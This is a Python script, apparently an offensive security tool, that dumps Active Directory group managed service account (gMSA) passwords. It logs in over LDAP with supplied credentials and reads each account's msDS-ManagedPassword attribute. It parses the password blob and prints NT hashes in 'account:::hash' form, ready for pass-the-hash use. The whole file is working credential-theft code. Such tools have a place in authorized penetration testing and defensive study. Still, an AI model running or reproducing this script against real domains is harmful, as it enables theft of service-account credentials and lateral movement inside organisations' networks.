#!/usr/bin/env python3
from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
import argparse
import binascii
from structure import Structure
from Cryptodome.Hash import MD4

parser = argparse.ArgumentParser(description='Dump gMSA Passwords')
parser.add_argument('-u','--username', help='username for LDAP', required=True)
parser.add_argument('-p','--password', help='password for LDAP (or LM:NT hash)',required=True)
parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
parser.add_argument('-d','--domain', help='Domain', required=True)

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]

def main():
    args = parser.parse_args()
    if args.ldapserver:
        server = Server(args.ldapserver, get_info=ALL)
    else:
        server = Server(args.domain, get_info=ALL)
    conn = Connection(server, user='{}\\{}'.format(args.domain, args.username), password=args.password, authentication=NTLM, auto_bind=True)
    conn.start_tls()
    success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
    if success:
        for entry in conn.entries:
            try:
                sam = entry['sAMAccountName'].value
                data = entry['msDS-ManagedPassword'].raw_values[0]
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                hash = MD4.new ()
                hash.update (blob['CurrentPassword'][:-2])
                passwd = binascii.hexlify(hash.digest()).decode("utf-8")
                userpass = sam + ':::' + passwd
                print(userpass)
            except:
                continue

if __name__ == "__main__":
    main()
